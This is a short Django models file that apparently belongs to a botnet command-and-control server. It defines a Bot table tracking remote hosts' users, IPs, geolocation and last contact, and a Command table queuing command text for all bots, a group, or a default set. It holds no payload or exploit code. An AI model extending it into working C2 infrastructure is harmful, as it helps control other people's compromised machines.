import datetime
from django.db import models
from django.utils import timezone


class Bot(models.Model):
    hash_type = models.CharField(max_length=15)
    hash_sum = models.CharField(max_length=200)
    group = models.IntegerField(default=0)
    operating_sys = models.CharField(max_length=50)
    user = models.CharField(max_length=20)
    ip_addr = models.CharField(max_length=16)
    geolocation = models.CharField(max_length=100)
    last_contact = models.DateTimeField('last_contact', default=timezone.now)

    def __str__(self):
        return '{}@{}({})'.format(self.user, self.hash_sum[:6], self.operating_sys)

    def is_active(self):
        now = timezone.now()
        return self.last_contact >= now - datetime.timedelta(days=20)

class Command(models.Model):
    cmd_txt = models.TextField(default='')
    start_time = models.DateTimeField('start_time', default=timezone.now)
    end_time = models.DateTimeField('end_time', default=timezone.now)
    group_assigned = models.IntegerField(default=-2, null=True, blank=True)
    hash_assigned = models.CharField(max_length=200, null=True, blank=True)
    oneshot = models.BooleanField(default=1)

    def __str__(self):
        if self.group_assigned == -1:
            return "All: {}".format(self.cmd_txt)
        if self.group_assigned == -2:
            return "Default: {}".format(self.cmd_txt)
        else:
            return "Group {}: {}".format(self.group_assigned, self.cmd_txt)
